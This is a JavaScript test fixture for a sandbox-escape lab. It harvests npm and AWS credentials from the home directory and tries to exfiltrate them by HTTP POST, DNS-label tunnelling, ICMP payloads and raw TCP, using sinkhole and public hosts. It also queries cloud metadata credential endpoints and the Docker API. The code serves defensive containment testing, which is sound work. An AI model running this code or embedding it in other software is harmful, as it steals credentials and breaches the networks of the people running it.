// Airlock test fixture: tries every way out of the sandbox it can think of, each carrying the
// credentials it finds, and writes down from the inside which attempts got an answer. Only ever
// run inside Airlock (evals/escape_lab.py). Names are .invalid; the raw addresses are public
// resolvers, documentation ranges, link-local metadata services and private ranges.
const fs = require('fs'), net = require('net'), dns = require('dns'), dgram = require('dgram');
const http = require('http'), https = require('https'), os = require('os'), { execFile } = require('child_process');

const read = (p) => { try { return fs.readFileSync(p, 'utf8'); } catch { return ''; } };
const npmrc = read(`${os.homedir()}/.npmrc`), aws = read(`${os.homedir()}/.aws/credentials`);
const token = (npmrc.match(/npm_([A-Z0-9]+)/) || [])[1] || 'NOTOKEN';
const loot = npmrc + aws;
const T = 3000;
// Addresses outside the sandbox where the lab listens (evals/escape_lab.py writes this file).
let target = {};
try { target = JSON.parse(read('/opt/escape-target.json')); } catch {}

// The default gateway, from the routing table (hex, little-endian).
const gw = (() => {
  for (const line of read('/proc/net/route').split('\n').slice(1)) {
    const f = line.trim().split(/\s+/);
    if (f[1] === '00000000' && f[2]) return f[2].match(/../g).reverse().map((h) => parseInt(h, 16)).join('.');
  }
  return null;
})();

function tcp(host, port, family, send) {
  return new Promise((done) => {
    const s = net.connect({ host, port, family, timeout: T });
    s.on('connect', () => {
      if (!send) { s.destroy(); done({ outcome: 'connected' }); return; }
      let got = '';
      s.on('data', (d) => { got += d; });
      s.write(send);
      setTimeout(() => { s.destroy(); done({ outcome: 'connected', detail: got ? `reply: ${got.slice(0, 160)}` : 'sent, no reply' }); }, 500);
    });
    s.on('timeout', () => { s.destroy(); done({ outcome: 'timeout' }); });
    s.on('error', (e) => done({ outcome: 'error', detail: e.code || e.message }));
  });
}

function web(url, method = 'POST', body = loot) {
  return new Promise((done) => {
    const mod = url.startsWith('https') ? https : http;
    const req = mod.request(url, { method, timeout: T, rejectUnauthorized: false, headers: { 'content-type': 'text/plain' } }, (res) => {
      let text = '';
      res.on('data', (d) => { text += d; });
      res.on('end', () => done({ outcome: 'answered', detail: `HTTP ${res.statusCode}, ${text.length} bytes`, server: res.headers.server || null,
        body: text.slice(0, 160), addr: req.socket && req.socket.remoteAddress }));
    });
    req.on('timeout', () => { req.destroy(); done({ outcome: 'timeout' }); });
    req.on('error', (e) => done({ outcome: 'error', detail: e.code || e.message }));
    if (method !== 'GET') req.write(body);
    req.end();
  });
}

function dnsQuery(server, name, viaTcp) {
  const labels = name.split('.').map((l) => Buffer.concat([Buffer.from([l.length]), Buffer.from(l)]));
  const q = Buffer.concat([Buffer.from([0x13, 0x37, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0]), ...labels, Buffer.from([0, 0, 1, 0, 1])]);
  return new Promise((done) => {
    const timer = setTimeout(() => { cleanup(); done({ outcome: 'timeout' }); }, T);
    let cleanup = () => {};
    if (viaTcp) {
      const s = net.connect({ host: server, port: 53 }, () => s.write(Buffer.concat([Buffer.from([q.length >> 8, q.length & 255]), q])));
      cleanup = () => s.destroy();
      s.on('data', (d) => { clearTimeout(timer); cleanup(); done({ outcome: 'answered', detail: `rcode ${d[5] & 15}, ${d.readUInt16BE(8)} answers` }); });
      s.on('error', (e) => { clearTimeout(timer); done({ outcome: 'error', detail: e.code }); });
    } else {
      const s = dgram.createSocket('udp4');
      cleanup = () => { try { s.close(); } catch {} };
      s.on('message', (d) => { clearTimeout(timer); cleanup(); done({ outcome: 'answered', detail: `rcode ${d[3] & 15}, ${d.readUInt16BE(6)} answers` }); });
      s.on('error', (e) => { clearTimeout(timer); cleanup(); done({ outcome: 'error', detail: e.code }); });
      s.send(q, 53, server);
    }
  });
}

const lookup = (name) => new Promise((done) => dns.lookup(name, (e, addr) =>
  done(e ? { outcome: 'error', detail: e.code } : { outcome: 'resolved', detail: addr, addr })));

const ping = (ip) => new Promise((done) => execFile('ping', ['-c', '1', '-W', '2', '-p', Buffer.from(token.slice(0, 16)).toString('hex'), ip],
  { timeout: T + 1000 }, (e, out, err) => done(e ? { outcome: 'error', detail: (err || e.message).trim().slice(0, 80) } : { outcome: 'answered' })));

const probes = [
  // Exfil to a name, the common case: the sinkhole should answer and keep the body.
  ['http-name-443', 'HTTPS POST to a name', () => web('https://h443.exfil-probe.invalid/x')],
  ['http-name-80', 'HTTP POST to a name', () => web('http://h80.exfil-probe.invalid/x')],
  ['http-name-odd-port', 'HTTP POST to a name on port 4444', () => web('http://odd.exfil-probe.invalid:4444/x')],
  // Exfil in DNS labels.
  ['dns-resolver', 'token in a DNS name, system resolver', () => lookup(`${token}.dns-res.invalid`)],
  ['dns-gateway-udp', 'token in a DNS name, straight to the gateway', () => gw ? dnsQuery(gw, `${token}.dns-gw.invalid`) : { outcome: 'skipped' }],
  ['dns-public-udp', 'token in a DNS name, straight to 8.8.8.8 (UDP)', () => dnsQuery('8.8.8.8', `${token}.dns-pub.invalid`)],
  ['dns-public-tcp', 'token in a DNS name, straight to 1.1.1.1 (TCP)', () => dnsQuery('1.1.1.1', `${token}.dns-tcp.invalid`, true)],
  // Does DNS sent straight to a public resolver reach it? A real name tells: only the internet can answer it.
  ['dns-public-real-udp', 'example.com straight to 8.8.8.8 (UDP)', () => dnsQuery('8.8.8.8', 'example.com')],
  ['dns-public-real-tcp', 'example.com straight to 1.1.1.1 (TCP)', () => dnsQuery('1.1.1.1', 'example.com', true)],
  ['dns-gateway-real', 'example.com straight to the gateway', () => gw ? dnsQuery(gw, 'example.com') : { outcome: 'skipped' }],
  // Raw IPs, skipping DNS.
  ['raw-ip-https', 'HTTPS POST to a public IP (1.1.1.1)', () => web('https://1.1.1.1/raw')],
  ['raw-ip-http', 'HTTP POST to a documentation IP (203.0.113.7)', () => web('http://203.0.113.7/raw')],
  ['raw-ip-odd-port', 'TCP to a public IP on port 4444 (8.8.4.4)', () => tcp('8.8.4.4', 4444)],
  ['ipv6', 'TCP over IPv6 to 2606:4700:4700::1111', () => tcp('2606:4700:4700::1111', 443, 6)],
  ['ipv6-http', 'HTTP GET over IPv6 to Cloudflare (2606:4700:4700::1111)', () => web('http://[2606:4700:4700::1111]/', 'GET')],
  // The lab's listeners outside the sandbox: anything they hear got past the egress policy.
  ['outside-v4-port', 'token over TCP to the lab listener, IPv4', () => target.v4 ? tcp(target.v4, target.port, 4, loot) : { outcome: 'skipped' }],
  ['outside-v6-port', 'token over TCP to the lab listener, IPv6', () => target.v6 ? tcp(target.v6, target.port, 6, loot) : { outcome: 'skipped' }],
  ['outside-v4-http', 'HTTP POST to the host\'s public IPv4, port 80', () => target.v4 ? web(`http://${target.v4}/x`) : { outcome: 'skipped' }],
  ['outside-v6-http', 'HTTP POST to the host\'s public IPv6, port 80', () => target.v6 ? web(`http://[${target.v6}]/x`) : { outcome: 'skipped' }],
  ['icmp', 'ping 1.1.1.1 with token bytes in the payload', () => ping('1.1.1.1')],
  ['icmp-socket', 'ICMP echo from an unprivileged ping socket (Python)', () => new Promise((done) => execFile('python3', ['-c',
    'import socket,sys\ns=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_ICMP)\ns.settimeout(2)\n'
    + 's.sendto(b"\\x08\\x00\\x00\\x00\\x00\\x01\\x00\\x01"+sys.argv[1].encode(),("1.1.1.1",0))\nprint(len(s.recv(512)))', token],
    { timeout: T + 1000 }, (e, out, err) => done(e ? { outcome: 'error', detail: (err || e.message).trim().split('\n').pop().slice(0, 80) }
      : { outcome: 'answered', detail: `${out.trim()} bytes back` })))],
  // Cloud metadata services: where a real CI runner keeps its cloud credentials.
  ['imds-aws', 'metadata service, AWS path (169.254.169.254)', () => web('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'GET')],
  ['imds-vultr', 'metadata service, Vultr path (169.254.169.254)', () => web('http://169.254.169.254/v1.json', 'GET')],
  ['imds-gcp-name', 'metadata service by name (metadata.google.internal)', () => web('http://metadata.google.internal/computeMetadata/v1/', 'GET')],
  ['imds-ecs', 'container credentials endpoint (169.254.170.2)', () => web('http://169.254.170.2/v2/credentials', 'GET')],
  ['imds-alibaba', 'metadata service, Alibaba (100.100.100.200)', () => web('http://100.100.100.200/latest/meta-data/', 'GET')],
  // The host and its neighbours.
  ...[22, 53, 80, 443, 1080, 2019, 8000].map((p) => [`gateway-${p}`, `TCP to the gateway (${gw}) port ${p}`, () => gw ? tcp(gw, p) : { outcome: 'skipped' }]),
  ['docker-api', 'Docker API on 172.17.0.1:2375', () => tcp('172.17.0.1', 2375)],
  ['private-10', 'private range 10.0.0.1:80', () => tcp('10.0.0.1', 80)],
  ['private-192', 'private range 192.168.1.1:80', () => tcp('192.168.1.1', 80)],
  // An allowed registry, with the token in the URL: it gets there, but only the registry sees it.
  ['registry-url', 'token in a search URL on registry.npmjs.org (allowed)', () => web(`https://registry.npmjs.org/-/v1/search?text=${token}&size=1`, 'GET')],
];

(async () => {
  const results = await Promise.all(probes.map(async ([id, what, run]) => {
    const t = Date.now();
    let r;
    try { r = await run(); } catch (e) { r = { outcome: 'error', detail: e.message }; }
    return { id, what, ...r, ms: Date.now() - t };
  }));
  fs.writeFileSync('/tmp/escape-probe.json', JSON.stringify({ token, gateway: gw, results }, null, 2));
})();
